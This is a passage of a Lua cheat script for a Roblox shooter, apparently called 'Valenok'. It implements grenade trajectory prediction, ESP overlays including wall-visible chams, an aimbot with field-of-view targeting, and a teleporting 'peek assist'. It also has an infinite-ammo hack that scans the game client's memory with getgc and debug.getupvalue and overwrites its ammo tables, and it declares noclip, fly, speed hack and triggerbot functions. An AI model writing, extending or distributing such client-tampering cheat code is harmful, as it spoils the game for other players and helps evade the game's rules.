    sphere.Anchored, sphere.CanCollide, sphere.CastShadow, sphere.Transparency, sphere.Parent = true, false, false, 1, folder
    GrenadeRuntime.Sphere = sphere
end

local grenadeHidden = true
local function hideGrenadePrediction()
    if grenadeHidden then return end
    for _, b in pairs(GrenadeRuntime.Beams) do b.Enabled = false end
    if GrenadeRuntime.Sphere then GrenadeRuntime.Sphere.Transparency = 1 end
    grenadeHidden = true
end

local function updateGrenadePrediction(dt)
    if not Toggles.GrenadesPrediction or not Toggles.GrenadesPrediction.Value then
        hideGrenadePrediction(); return
    end
    ensureGrenadePredictionObjects()
    if not isHoldingNade() or not (GrenadeRuntime.LmbDown or GrenadeRuntime.RmbDown) then
        hideGrenadePrediction(); return
    end
    grenadeHidden = false

    local cam = getCamera()
    if not cam then return end

    local rgb = Options.GrenadesPredictionColor and Options.GrenadesPredictionColor.Value or Color3.fromRGB(255, 50, 50)
    local c3 = typeof(rgb) == "Color3" and rgb or Color3.new(1, 0.2, 0.2)

    local trajectoryCache = GrenadeRuntime.TrajectoryCache
    if trajectoryCache.beamColor ~= c3 then
        trajectoryCache.beamColor = c3
        local colorSequence = ColorSequence.new(c3)
        for _, b in pairs(GrenadeRuntime.Beams) do
            b.Color = colorSequence
        end
    end
    for _, b in pairs(GrenadeRuntime.Beams) do
        b.Enabled = false
    end
    GrenadeRuntime.Sphere.Color = c3

    GrenadeRuntime.PulseVal = GrenadeRuntime.PulseVal + (GrenadeRuntime.PulseDir * (dt or 0.016) * 2.5)
    if GrenadeRuntime.PulseVal >= 1.6 then GrenadeRuntime.PulseDir = -1 end
    if GrenadeRuntime.PulseVal <= 0.7 then GrenadeRuntime.PulseDir = 1 end
    GrenadeRuntime.Sphere.Size = Vector3.new(GrenadeRuntime.PulseVal, GrenadeRuntime.PulseVal, GrenadeRuntime.PulseVal)

    local lp = LocalPlayer
    local _, _, hrp = getCachedCharacterParts(lp)
    local plrVel = hrp and hrp.AssemblyLinearVelocity or Vector3.new()
    local nadeType = getNadeType()
    local camLook = cam.CFrame.LookVector
    local startPos = getNadePosition()

    local needsRecalc = false
    if not GrenadeRuntime.TrajectoryCache.lastPos or (startPos - GrenadeRuntime.TrajectoryCache.lastPos).Magnitude > 0.5 then
        needsRecalc = true
    elseif not GrenadeRuntime.TrajectoryCache.lastLook or camLook:Dot(GrenadeRuntime.TrajectoryCache.lastLook) < 0.9994 then
        needsRecalc = true
    elseif nadeType ~= GrenadeRuntime.TrajectoryCache.lastNadeType then
        needsRecalc = true
    elseif not GrenadeRuntime.TrajectoryCache.lastVel or (plrVel - GrenadeRuntime.TrajectoryCache.lastVel).Magnitude > 5 then
        needsRecalc = true
    end

    if not needsRecalc and GrenadeRuntime.TrajectoryCache.cachedPoints then
        local numPoints = #GrenadeRuntime.TrajectoryCache.cachedPoints
        for j = 1, numPoints do
            local pt = GrenadeRuntime.TrajectoryCache.cachedPoints[j]
            local att = GrenadeRuntime.Attachments[j]
            if att then att.WorldPosition = pt.pos end
            if j > 1 and GrenadeRuntime.Beams[j - 1] then
                GrenadeRuntime.Beams[j - 1].Transparency = pt.sequence
                GrenadeRuntime.Beams[j - 1].Enabled = true
            end
        end
        for j = numPoints, 39 do
            if GrenadeRuntime.Beams[j] then GrenadeRuntime.Beams[j].Enabled = false end
        end
        if GrenadeRuntime.Sphere then
            GrenadeRuntime.Sphere.CFrame = CFrame.new(GrenadeRuntime.TrajectoryCache.cachedSpherePos)
            GrenadeRuntime.Sphere.Transparency = 0.3
        end
        return
    end

    GrenadeRuntime.TrajectoryCache.lastPos = startPos
    GrenadeRuntime.TrajectoryCache.lastLook = camLook
    GrenadeRuntime.TrajectoryCache.lastNadeType = nadeType
    GrenadeRuntime.TrajectoryCache.lastVel = plrVel

    local params = CONSTANTS.GRENADE_PARAMS[nadeType] or CONSTANTS.GRENADE_PARAMS.default
    local maxBounces = params.maxBounces
    local bounceDamping = params.bounceDamping
    local velocity = cam.CFrame.LookVector * CONSTANTS.GRENADE_PARAMS.LOOK_SPEED + plrVel * CONSTANTS.GRENADE_PARAMS.PLR_FACTOR + Vector3.new(0, CONSTANTS.GRENADE_PARAMS.UP_BIAS, 0)
    local grav = Vector3.new(0, -workspace.Gravity, 0)

    local tStep = 1 / 60
    local maxSteps = 240
    local currentPos = startPos

    if not GrenadeRuntime.RP then
        local rp = RaycastParams.new()
        rp.FilterType = Enum.RaycastFilterType.Exclude
        GrenadeRuntime.RP = rp
        GrenadeRuntime.FilterList = { lp.Character, getCachedRayIgnore(), GrenadeRuntime.Folder }
        local clips = getMapClips()
        if clips then table.insert(GrenadeRuntime.FilterList, clips) end
        local spawns = getMapSpawns()
        if spawns then table.insert(GrenadeRuntime.FilterList, spawns) end
    end
    GrenadeRuntime.FilterList[1] = lp.Character
    GrenadeRuntime.FilterList[3] = GrenadeRuntime.Folder
    GrenadeRuntime.RP.FilterDescendantsInstances = GrenadeRuntime.FilterList
    local rp = GrenadeRuntime.RP

    local bounces = 0
    local pointCount = 1
    local firstAtt = GrenadeRuntime.Attachments[1]
    if not firstAtt then return end
    firstAtt.WorldPosition = startPos

    local samplePeriod = 2
    local stepIdx = 0
    for _ = 1, maxSteps do
        local nextVel = velocity + (grav * tStep)
        local moveDelta = (velocity + nextVel) * 0.5 * tStep
        local nextPos = currentPos + moveDelta

        local ray = workspace:Raycast(currentPos, nextPos - currentPos, rp)
        if ray then
            bounces = bounces + 1
            nextPos = ray.Position + ray.Normal * 0.05
            local normal = ray.Normal
            local reflected = nextVel - (2 * nextVel:Dot(normal) * normal)
            velocity = reflected * bounceDamping
            local isFloor = normal.Y > 0.6
            if (nadeType == "molotov" and isFloor) or bounces >= maxBounces or velocity.Magnitude < 5 then
                if pointCount < 40 then
                    pointCount = pointCount + 1
                    local att = GrenadeRuntime.Attachments[pointCount]
                    local beam = GrenadeRuntime.Beams[pointCount - 1]
                    if att then att.WorldPosition = nextPos end
                    if beam then beam.Transparency = NumberSequence.new(0.15 + (pointCount / 40) * 0.85) end
                end
                currentPos = nextPos
                break
            end
        else
            velocity = nextVel
        end

        currentPos = nextPos
        stepIdx = stepIdx + 1
        if stepIdx % samplePeriod == 0 or ray then
            if pointCount >= 40 then break end
            pointCount = pointCount + 1
            local att = GrenadeRuntime.Attachments[pointCount]
            local beam = GrenadeRuntime.Beams[pointCount - 1]
            if not att then
                pointCount = pointCount - 1
                break
            end
            att.WorldPosition = nextPos
            if beam then beam.Transparency = NumberSequence.new(0.15 + (pointCount / 40) * 0.85) end
        end
    end

    for j = 1, math.min(pointCount - 1, 39) do
        if GrenadeRuntime.Beams[j] then
            GrenadeRuntime.Beams[j].Enabled = true
        end
    end
    for j = pointCount, 39 do
        if GrenadeRuntime.Beams[j] then GrenadeRuntime.Beams[j].Enabled = false end
    end

    local cachedPoints = {}
    for j = 1, pointCount do
        local att = GrenadeRuntime.Attachments[j]
        if att then
            cachedPoints[#cachedPoints + 1] = {
                pos = att.WorldPosition,
                transparency = 0.15 + (j / 40) * 0.85,
                sequence = NumberSequence.new(0.15 + (j / 40) * 0.85),
            }
        end
    end
    GrenadeRuntime.TrajectoryCache.cachedPoints = cachedPoints
    GrenadeRuntime.TrajectoryCache.cachedSpherePos = currentPos

    if GrenadeRuntime.Sphere then
        GrenadeRuntime.Sphere.CFrame = CFrame.new(currentPos)
        GrenadeRuntime.Sphere.Transparency = 0.3
    end
end

EspRuntime.Connections.GrenadeInputBegan = UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then GrenadeRuntime.LmbDown = true end
    if input.UserInputType == Enum.UserInputType.MouseButton2 then GrenadeRuntime.RmbDown = true end
end)
EspRuntime.Connections.GrenadeInputEnded = UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then GrenadeRuntime.LmbDown = false end
    if input.UserInputType == Enum.UserInputType.MouseButton2 then GrenadeRuntime.RmbDown = false end
end)

local function ensureHitMarkerLines()
    if HitMarkerState.Created then return end
    if getgenv().ValenokHitMarker then
        for _, d in ipairs(getgenv().ValenokHitMarker) do if d then d.Visible = false; d:Remove() end end
    end
    local all = {}
    for i = 1, 4 do
        local ok1, ol = pcall(Drawing.new, "Line")
        if ok1 and ol then ol.Visible, ol.ZIndex = false, 1; HitMarkerState.OutlineLines[i] = ol; all[#all + 1] = ol end
        local ok2, fl = pcall(Drawing.new, "Line")
        if ok2 and fl then fl.Visible, fl.ZIndex = false, 2; HitMarkerState.FillLines[i] = fl; all[#all + 1] = fl end
    end
    getgenv().ValenokHitMarker = all
    HitMarkerState.Created = true
end

ShowHitMarker = function()
    ensureHitMarkerLines()
    local cam = getCamera()
    if not cam or not cam.ViewportSize then return end
    local vs = cam.ViewportSize
    local cx, cy, gap, len, th = vs.X * 0.5, vs.Y * 0.5, 2, 5, 1
    local color = (Options.MiscHitMarkerColor and Options.MiscHitMarkerColor.Value) or Color3.fromRGB(255, 255, 255)
    local segs = {
        {Vector2.new(cx - gap - len, cy - gap - len), Vector2.new(cx - gap, cy - gap)},
        {Vector2.new(cx + gap, cy - gap), Vector2.new(cx + gap + len, cy - gap - len)},
        {Vector2.new(cx - gap - len, cy + gap + len), Vector2.new(cx - gap, cy + gap)},
        {Vector2.new(cx + gap, cy + gap), Vector2.new(cx + gap + len, cy + gap + len)},
    }
    for i, seg in ipairs(segs) do
        local from, to = seg[1], seg[2]
        local d = to - from
        local unit = d.Magnitude > 0 and d.Unit or Vector2.new(0, 0)
        local ol, fl = HitMarkerState.OutlineLines[i], HitMarkerState.FillLines[i]
        if ol then ol.From, ol.To, ol.Thickness, ol.Color, ol.Transparency, ol.Visible = from - unit, to + unit, th + 2, Color3.new(), 1, true end
        if fl then fl.From, fl.To, fl.Thickness, fl.Color, fl.Transparency, fl.Visible = from, to, th, color, 1, true end
    end
    HitMarkerState.Gen = HitMarkerState.Gen + 1
    local lifetime = (Options.MiscHitMarkerLifetime and Options.MiscHitMarkerLifetime.Value) or 1
    local fadeTime = math.min(0.3, lifetime)
    HitMarkerState.HoldUntil, HitMarkerState.FadeDuration, HitMarkerState.Fading = tick() + (lifetime - fadeTime), fadeTime, true
    if not HitMarkerState.HeartbeatConn then
        HitMarkerState.HeartbeatConn = RunService.Heartbeat:Connect(function()
            if not HitMarkerState.Fading then return end
            local now = tick()
            if now < HitMarkerState.HoldUntil then return end
            local alpha = 1 - math.clamp((now - HitMarkerState.HoldUntil) / HitMarkerState.FadeDuration, 0, 1)
            for _, obj in ipairs(HitMarkerState.OutlineLines) do if obj then obj.Transparency = alpha end end
            for _, obj in ipairs(HitMarkerState.FillLines) do if obj then obj.Transparency = alpha end end
            if alpha <= 0 then
                for _, obj in ipairs(HitMarkerState.OutlineLines) do if obj then obj.Visible, obj.Transparency = false, 1 end end
                for _, obj in ipairs(HitMarkerState.FillLines) do if obj then obj.Visible, obj.Transparency = false, 1 end end
                HitMarkerState.Fading = false
                if HitMarkerState.HeartbeatConn then
                    HitMarkerState.HeartbeatConn:Disconnect()
                    HitMarkerState.HeartbeatConn = nil
                end
            end
        end)
    end
end

PlayHitSound = function()
    if not Toggles.MiscHitSound or not Toggles.MiscHitSound.Value then return end
    if not _hitSoundObj then return end
    local soundType = Options.MiscHitSoundType and Options.MiscHitSoundType.Value or "Skeet"
    local sndId = CONSTANTS.HitSounds[soundType]
    if type(sndId) == "table" then sndId = sndId[math.random(1, #sndId)] end
    if type(sndId) == "number" then sndId = "rbxassetid://" .. sndId end
    _hitSoundObj.SoundId = sndId or "rbxassetid://3124331820"
    _hitSoundObj.Volume = Options.MiscHitSoundVolume and Options.MiscHitSoundVolume.Value or 5
    _hitSoundObj:Play()
end

local function tv(name)
    local t = Toggles[name]
    return t and t.Value
end

local function isAnyEspEnabled()
    return tv("ESPEnable") or tv("ESPBox") or tv("ESPBoxFill") or tv("ESPName")
        or tv("ESPWeapon") or tv("ESPHealthBar") or tv("ESPChams") or tv("ESPOofArrows")
end

local function updateEspFrameCache()
    local now = tick()
    if now == EspFrameCache.tick then return end
    EspFrameCache.tick = now
    EspFrameCache.anyEnabled = isAnyEspEnabled()
    local toggles, options, colors = EspFrameCache.toggles, EspFrameCache.options, EspFrameCache.colors
    toggles.teamCheck = tv("ESPTeamCheck")
    toggles.box = tv("ESPBox")
    toggles.name = tv("ESPName")
    toggles.boxFill = tv("ESPBoxFill")
    toggles.weapon = tv("ESPWeapon")
    toggles.healthBar = tv("ESPHealthBar")
    toggles.healthBarOutline = tv("ESPHealthBarOutline")
    toggles.chams = tv("ESPEnable") and tv("ESPChams")
    toggles.chamsType = (Options.ESPChamsType and Options.ESPChamsType.Value) or "Highlight"
    toggles.oof = tv("ESPOofArrows")
    toggles.item = tv("ESPItemESP")
    options.oofSize = (Options.ESPOofSize and Options.ESPOofSize.Value) or 12
    options.oofDistance = (Options.ESPOofDistance and Options.ESPOofDistance.Value) or 40
    local W = Color3.fromRGB(255, 255, 255)
    colors.box = getOptionColor("ESPBoxColor", W)
    colors.name = getOptionColor("ESPNameColor", W)
    colors.weapon = getOptionColor("ESPWeaponColor", W)
    colors.healthHigh = getOptionColor("ESPHealthBarHighColor", Color3.fromRGB(0, 255, 0))
    colors.healthLow = getOptionColor("ESPHealthBarLowColor", Color3.fromRGB(255, 0, 0))
    colors.boxFill = getOptionColor("ESPBoxFillColor", W)
    colors.chamsVisible = getOptionColor("ESPChamsVisibleColor", Color3.fromRGB(0, 255, 120))
    colors.chamsWall = getOptionColor("ESPChamsWallColor", Color3.fromRGB(255, 60, 60))
    colors.oof = getOptionColor("ESPOofColor", W)
    colors.item = getOptionColor("ESPItemColor", W)
    local fillOpt = Options.ESPBoxFillColor
    EspFrameCache.boxFillTransparency = (fillOpt and fillOpt.Transparency) and math.clamp(1 - fillOpt.Transparency, 0, 1) or 1
    EspFrameCache.chamsVisibleTransparency = getChamsTransparency("ESPChamsVisibleColor", 0.35)
    EspFrameCache.chamsWallTransparency = getChamsTransparency("ESPChamsWallColor", 0.35)
end


local updateRCS, updateRapidFire, updateFullAuto, restoreAllRapidFireRates, restoreAllFullAutoValues, updateInfAmmo
local applyNoRecoil, applyNoSpread, applyInstaEquip, applyInstaReload, fireSingleShot, fireWeapShot, updateTriggerbot
local InfAmmoState = {
    table = nil,
    lastScan = 0,
    lastApply = 0,
    scanBackoff = 5,
    gcTried = false,
    scanning = false,
    charConn = nil,
}

local function isClientAmmoTable(obj)
    if type(obj) ~= "table" then return false end
    local a1, a2, a3, a4 = rawget(obj, "ammocount"), rawget(obj, "ammocount2"), rawget(obj, "ammocount3"), rawget(obj, "ammocount4")
    return type(a1) == "number" and type(a2) == "number" and type(a3) == "number" and type(a4) == "number"
        and rawget(obj, "DISABLED") ~= nil and rawget(obj, "reloading") ~= nil
end

local function tryFindAmmoFromClientEnv()
    local client = getCachedClient and getCachedClient() or nil
    if type(client) ~= "table" then return nil end

    if isClientAmmoTable(client) then
        return client
    end

    for _, obj in pairs(client) do
        if isClientAmmoTable(obj) then
            return obj
        end
    end

    if debug and type(debug.getupvalue) == "function" then
        local fnNames = { "usethatgun", "loadammo", "isgrenade", "updatesilencer", "resetguns", "countammo" }
        for i = 1, #fnNames do
            local fn = rawget(client, fnNames[i])
            if type(fn) == "function" then
                local ok, found = pcall(function()
                    local ui = 1
                    while ui <= 64 do
                        local name, val = debug.getupvalue(fn, ui)
                        if name == nil and val == nil then break end
                        if isClientAmmoTable(val) then return val end
                        ui = ui + 1
                    end
                    return nil
                end)
                if ok and found then return found end
            end
        end
    end

    return nil
end

local function requestClientAmmoScan(force)
    if InfAmmoState.scanning then return end
    local now = tick()
    if not force and now - InfAmmoState.lastScan < InfAmmoState.scanBackoff then
        return
    end
    InfAmmoState.lastScan = now
    InfAmmoState.scanning = true

    task.spawn(function()
        local ok, result = pcall(function()
            local found = tryFindAmmoFromClientEnv()
            if found then return found end

            if getgc and not InfAmmoState.gcTried then
                InfAmmoState.gcTried = true
                for _, obj in ipairs(getgc(true)) do
                    if isClientAmmoTable(obj) then
                        return obj
                    end
                end
            end
            return nil
        end)

        InfAmmoState.scanning = false
        if ok and result then
            InfAmmoState.table = result
            InfAmmoState.scanBackoff = 2
        else
            InfAmmoState.scanBackoff = math.min((InfAmmoState.scanBackoff or 2) * 2, 60)
        end
    end)
end

updateInfAmmo = function()
    if not Toggles.ExploitInfAmmo or not Toggles.ExploitInfAmmo.Value then return end
    local now = tick()
    if now - InfAmmoState.lastApply < 0.05 then return end
    InfAmmoState.lastApply = now

    if not isClientAmmoTable(InfAmmoState.table) then
        InfAmmoState.table = nil
        requestClientAmmoScan(false)
        return
    end

    local t = InfAmmoState.table
    local v = 99999
    t.ammocount, t.ammocount2, t.ammocount3, t.ammocount4 = v, v, v, v
    if rawget(t, "primarystored") ~= nil then t.primarystored = v end
    if rawget(t, "secondarystored") ~= nil then t.secondarystored = v end
    if rawget(t, "equipmentstored") ~= nil then t.equipmentstored = v end
    if rawget(t, "equipment2stored") ~= nil then t.equipment2stored = v end
end

if not InfAmmoState.charConn then
    InfAmmoState.charConn = LocalPlayer.CharacterAdded:Connect(function()
        InfAmmoState.table = nil
        InfAmmoState.gcTried = false
        InfAmmoState.scanBackoff = 5
        if Toggles and Toggles.ExploitInfAmmo and Toggles.ExploitInfAmmo.Value then
            task.defer(function()
                requestClientAmmoScan(true)
            end)
        end
    end)
end

local updateBhop, updateLegitBhop, updateThirdPerson, updateThirdPersonNoClip, updateNoclip, updateFly, updateAutoJump, updateAutoCrouch, updateSpeedHack, updateFakeDuck
local updateNoScope, updateNoFlash, applyNoScope, setupNoSmoke
local ensureCrosshair, updateCrosshair, unloadValenok
local updateViewModelVisuals
local applySkyboxChanger
local LoopState

local AimRuntime = {}

local TriggerbotState = {
    DelayUntil = 0,
    DelayActive = false,
    IsFiring = false,
    LastFire = 0,
}


local PeekAssist = {
    SavedCFrame = nil,
    Active      = false,
    Returning   = false,
    LastBindOn  = false,
}

local PeekWallParams = RaycastParams.new()
PeekWallParams.FilterType  = Enum.RaycastFilterType.Exclude
PeekWallParams.IgnoreWater = true

local PEEK_CIRCLE_SEGMENTS = 96
local PEEK_FILL_LAYERS = 8
local PEEK_FILL_PER_LAYER = 24
local PEEK_FILL_SEGMENTS = PEEK_FILL_LAYERS * PEEK_FILL_PER_LAYER

local PeekDraw = {
    CircleLines = {},
    CircleOutlines = {},
    FillLines = {},
    FilterList = {},
    PulseVal = 0,
    PulseDir = 1,
    Ready = false,
}

ensurePeekDrawings = function()
    if PeekDraw.Ready then return end
    for i = 1, PEEK_CIRCLE_SEGMENTS do
        local ln = Drawing.new("Line")
        ln.Visible, ln.Thickness, ln.Transparency = false, 2, 1
        ln.Color, ln.ZIndex = Color3.fromRGB(135, 206, 250), 2
        PeekDraw.CircleLines[i] = ln
        local ol = Drawing.new("Line")
        ol.Visible, ol.Thickness, ol.Transparency = false, 4, 1
        ol.Color, ol.ZIndex = Color3.fromRGB(0, 0, 0), 1
        PeekDraw.CircleOutlines[i] = ol
    end
    for i = 1, PEEK_FILL_SEGMENTS do
        local ln = Drawing.new("Line")
        ln.Visible, ln.Thickness, ln.Transparency = false, 1, 0.5
        ln.Color = Color3.fromRGB(135, 206, 250)
        PeekDraw.FillLines[i] = ln
    end
    PeekDraw.Ready = true
end

local function hidePeekCircle()
    for i = 1, PEEK_CIRCLE_SEGMENTS do
        if PeekDraw.CircleLines[i] then PeekDraw.CircleLines[i].Visible = false end
        if PeekDraw.CircleOutlines[i] then PeekDraw.CircleOutlines[i].Visible = false end
    end
    for i = 1, PEEK_FILL_SEGMENTS do
        if PeekDraw.FillLines[i] then PeekDraw.FillLines[i].Visible = false end
    end
end

local function drawPeekCircle(cam, worldPos)
    ensurePeekDrawings()
    local viewportSize = cam.ViewportSize
    local RADIUS = 2.4

    PeekDraw.PulseVal = PeekDraw.PulseVal + (PeekDraw.PulseDir * 0.02)
    if PeekDraw.PulseVal >= 1 then PeekDraw.PulseVal = 1; PeekDraw.PulseDir = -1 end
    if PeekDraw.PulseVal <= 0.3 then PeekDraw.PulseVal = 0.3; PeekDraw.PulseDir = 1 end
    local pulseAlpha = PeekDraw.PulseVal

    for i = 1, PEEK_CIRCLE_SEGMENTS do
        local a1 = (i - 1) / PEEK_CIRCLE_SEGMENTS * math.pi * 2
        local a2 =  i      / PEEK_CIRCLE_SEGMENTS * math.pi * 2
        local p1 = worldPos + Vector3.new(math.cos(a1) * RADIUS, 0, math.sin(a1) * RADIUS)
        local p2 = worldPos + Vector3.new(math.cos(a2) * RADIUS, 0, math.sin(a2) * RADIUS)
        local s1 = cam:WorldToViewportPoint(p1)
        local s2 = cam:WorldToViewportPoint(p2)
        local ln = PeekDraw.CircleLines[i]
        local ol = PeekDraw.CircleOutlines[i]

        if s1.Z > 0 and s2.Z > 0 then
            local v1 = Vector2.new(s1.X, s1.Y)
            local v2 = Vector2.new(s2.X, s2.Y)
            ol.From = v1; ol.To = v2; ol.Visible = true
            ln.From = v1; ln.To = v2; ln.Visible = true
        else
            ln.Visible = false
            if ol then ol.Visible = false end
        end
    end

    local center2d = cam:WorldToViewportPoint(worldPos)
    if center2d.Z <= 0 then
        for i = 1, PEEK_FILL_SEGMENTS do
            if PeekDraw.FillLines[i] then PeekDraw.FillLines[i].Visible = false end
        end
        return
    end
    local fillIdx = 1
    for layer = 1, PEEK_FILL_LAYERS do
        local r = RADIUS * (layer / PEEK_FILL_LAYERS)
        local layerAlpha = (1 - layer / PEEK_FILL_LAYERS) * pulseAlpha
        for i = 1, PEEK_FILL_PER_LAYER do
            local angle = ((i - 1) / PEEK_FILL_PER_LAYER) * math.pi * 2
            local pw = worldPos + Vector3.new(math.cos(angle) * r, 0, math.sin(angle) * r)
            local sw = cam:WorldToViewportPoint(pw)
            local fl = PeekDraw.FillLines[fillIdx]

            if sw.Z > 0 then
                fl.From    = Vector2.new(center2d.X, center2d.Y)
                fl.To      = Vector2.new(sw.X, sw.Y)
                fl.Transparency = 1 - layerAlpha
                fl.Visible = true
            else
                fl.Visible = false
            end

            fillIdx = fillIdx + 1
        end
    end
end

local function isPeekKeybindActive()
    if not Toggles.PeekAssistEnable or not Toggles.PeekAssistEnable.Value then return false end
    return isKeybindActive(Options.PeekAssistKeybind)
end

local function retreatToSaved(savedCF)
    PeekAssist.Returning = true
    task.spawn(function()
        local char = LocalPlayer.Character
        local _, hum, hrp = getCachedCharacterParts(LocalPlayer)
        if hrp then
            local baseSpeed = (hum and hum.WalkSpeed and hum.WalkSpeed > 0) and hum.WalkSpeed or 16
            local moveSpeed = baseSpeed * 4
            local targetPos = savedCF.Position
            local deadline  = tick() + 3
            local lastT     = tick()

            while PeekAssist.Returning and tick() < deadline do
                local c2 = LocalPlayer.Character
                local h2 = c2 and c2:FindFirstChild("HumanoidRootPart")
                if not h2 then break end

                local now = tick()
                local dt  = now - lastT
                lastT = now

                local cur      = h2.Position
                local toTarget = targetPos - cur
                local dist     = toTarget.Magnitude
                if dist < 0.5 then
                    if h2 then h2.CFrame = savedCF end
                    break
                end

                local step = moveSpeed * dt
                if step >= dist then
                    if h2 then h2.CFrame = savedCF end
                    break
                else
                    local newPos = cur + toTarget.Unit * step
                    if h2 then h2.CFrame = CFrame.new(newPos, newPos + h2.CFrame.lookVector) end
                end
                RunService.RenderStepped:Wait()
            end

            local c3 = LocalPlayer.Character
            local h3 = c3 and c3:FindFirstChild("HumanoidRootPart")
            if h3 then h3.CFrame = savedCF end
        end
        PeekAssist.Returning   = false
        PeekAssist.SavedCFrame = nil
        PeekAssist.Active      = false
    end)
end

local function updatePeekAssist()
    if not Toggles.PeekAssistEnable or not Toggles.PeekAssistEnable.Value then
        hidePeekCircle()
        PeekAssist.Active  = false
        PeekAssist.Returning = false
        return
    end

    local cam = getCamera()
    if not cam then return end

    local bindOn = isKeybindActive(Options.PeekAssistKeybind)

    local char     = LocalPlayer.Character
    local _, humanoid, hrp = getCachedCharacterParts(LocalPlayer)

    if bindOn and not PeekAssist.LastBindOn then
        if hrp then
            PeekAssist.SavedCFrame = hrp.CFrame
            PeekAssist.Active      = true
            PeekAssist.Returning   = false
        end
    elseif not bindOn and PeekAssist.LastBindOn then
        PeekAssist.Active = false
        if not PeekAssist.Returning and PeekAssist.SavedCFrame then
            local retreatMode = Options.PeekAssistRetreatMode and Options.PeekAssistRetreatMode.Value or "On Key"
            if retreatMode == "On Key" then
                retreatToSaved(PeekAssist.SavedCFrame)
            else
                PeekAssist.SavedCFrame = nil
            end
        end
    end
    PeekAssist.LastBindOn = bindOn

    if PeekAssist.Active and PeekAssist.SavedCFrame and hrp then
        local distance = (hrp.Position - PeekAssist.SavedCFrame.Position).Magnitude
        if distance > 50 then
            PeekAssist.SavedCFrame = nil
            PeekAssist.Active = false
            PeekAssist.Returning = false
        end
    end

    if PeekAssist.SavedCFrame and cam then
        local wallBlocked = false
        if hrp then
            local origin = hrp.Position
            local target = PeekAssist.SavedCFrame.Position
            local dir    = target - origin
            PeekWallParams.FilterDescendantsInstances = buildRayIgnoreList()
            local hit = Workspace:Raycast(origin, dir, PeekWallParams)
            if hit and hit.Instance and hit.Instance.CanCollide then
                local isPlayer = false
                local parent = hit.Instance.Parent
                while parent and parent ~= Workspace do
                    if parent:FindFirstChildOfClass("Humanoid") then
                        isPlayer = true
                        break
                    end
                    parent = parent.Parent
                end
                if not isPlayer then
                    wallBlocked = true
                    hidePeekCircle()
                end
            end
        end
        if not wallBlocked then
            local floorPos = PeekAssist.SavedCFrame.Position - Vector3.new(0, 2.8, 0)
            drawPeekCircle(cam, floorPos)
        end
    else
        hidePeekCircle()
    end
end

peekAssistOnShot = function()
    if not Toggles.PeekAssistEnable or not Toggles.PeekAssistEnable.Value then return end
    local retreatMode = Options.PeekAssistRetreatMode and Options.PeekAssistRetreatMode.Value or "On Key"
    if retreatMode ~= "On Shot" then return end
    if not PeekAssist.SavedCFrame then return end
    retreatToSaved(PeekAssist.SavedCFrame)
end

local RapidFireState = { SavedFireRates = {} }
local FullAutoState = { SavedAutoValues = {} }
local InstaWeaponState = { SavedEquipTimes = {}, SavedReloadTimes = {} }
local SavedRecoilValues, RCSOriginalValues = {}, {}
local OriginalAccuracySd

local function getAimFov()
    local fovValue = Options.AimbotFOV and Options.AimbotFOV.Value
    if type(fovValue) ~= "number" then return 45 end
    return math.clamp(fovValue, 1, 180)
end

local function getAimSmooth()
    local smoothValue = Options.AimbotSmooth and Options.AimbotSmooth.Value
    if type(smoothValue) ~= "number" then return 4 end
    return math.clamp(smoothValue, 1, 10)
end

local function getAimFovRadius()
    local aimFov = getAimFov()
    if aimFov >= 180 then return 999999 end
    local cam = getCamera()
    if not cam then return 0 end
    local halfViewport = cam.ViewportSize.Y * 0.5
    local camFovHalfRad = math.rad(cam.FieldOfView * 0.5)
    local aimFovHalfRad = math.rad(aimFov * 0.5)
    return (math.tan(aimFovHalfRad) / math.tan(camFovHalfRad)) * halfViewport
end

local function getAimHitboxPart(character, humanoid, cam, screenCenter, selectedHitbox)
    selectedHitbox = selectedHitbox or (Options.AimbotHitbox and Options.AimbotHitbox.Value or "Head")
    if type(selectedHitbox) == "table" then
        for _, group in ipairs(CONSTANTS.RageHitboxPriority) do
            if CombatScan.rageHitboxOn(group, selectedHitbox) then
                selectedHitbox = group
                break
            end
        end
    end

    if selectedHitbox == "Nearest" then
        local allParts = {}
        for _, part in ipairs(character:GetChildren()) do
            if part:IsA("BasePart") and CONSTANTS.RealHitboxLookup[part.Name] then
                table.insert(allParts, part)
            end
        end

        local bestPart = nil
        local bestDistance = math.huge
        cam = cam or getCamera()
        screenCenter = screenCenter or Vector2.new(cam.ViewportSize.X * 0.5, cam.ViewportSize.Y * 0.5)

        for _, part in ipairs(allParts) do
            local delta = part.Position - cam.CFrame.Position
            local mag = delta.Magnitude
            if mag > 1e-4 then
                local ang = math.acos(math.clamp(cam.CFrame.LookVector:Dot(delta / mag), -1, 1))
                if ang < bestDistance then
                    bestDistance = ang
                    bestPart = part
                end
            end
        end

        return bestPart
    end

    local fallbacks = CONSTANTS.AimHitboxFallbacks[selectedHitbox] or CONSTANTS.AimHitboxFallbacks.Head

    for _, partName in ipairs(fallbacks) do
        local part = findCharacterPart(character, partName)
        if part then
            return part
        end
    end

    return nil
end

local function getClosestAimTarget(screenCenter, fovRadius)
    local bestPart = nil
    local bestPoint = nil
    local bestMetric = math.huge
    local useVisible = Toggles.AimbotVisibleCheck and Toggles.AimbotVisibleCheck.Value
    local aimFov = getAimFov()
    local maxAngle = aimFov >= 180 and math.huge or math.rad(aimFov * 0.5)
    local cam = getCamera()
    local camLook = cam.CFrame.LookVector
    local camPos = cam.CFrame.Position

    for i = 1, #CombatScan.list do
        local entry = CombatScan.list[i]
        if not entry or not entry.part or not entry.part.Parent then continue end
        if not isEnemyFor(entry.player, Toggles.AimbotTeamCheck) then continue end
        if hasShield(entry.character) then continue end

        local aimPart, aimPoint
        if useVisible then
            if not entry.strictPart or typeof(entry.strictPoint) ~= "Vector3" then continue end
            aimPart = entry.strictPart
            aimPoint = entry.strictPoint
        else
            aimPart = entry.part
            aimPoint = entry.point
            if typeof(aimPoint) ~= "Vector3" then
                aimPoint = aimPart.Position
            end
        end

        local delta = aimPoint - camPos
        local mag = delta.Magnitude
        if mag < 1e-4 then continue end
        local angle = math.acos(math.clamp(camLook:Dot(delta / mag), -1, 1))
        if angle > maxAngle then continue end
        if angle < bestMetric then
            bestMetric = angle
            bestPart = aimPart
            bestPoint = aimPoint
        end
    end

    return bestPart, bestPoint
end

local function updateAimBot(dt)
    local cam = getCamera()
    local aimShouldRun = Toggles.AimbotEnable and Toggles.AimbotEnable.Value and isKeybindActive(Options.AimbotKeybind)
    if not cam or not aimShouldRun then return end
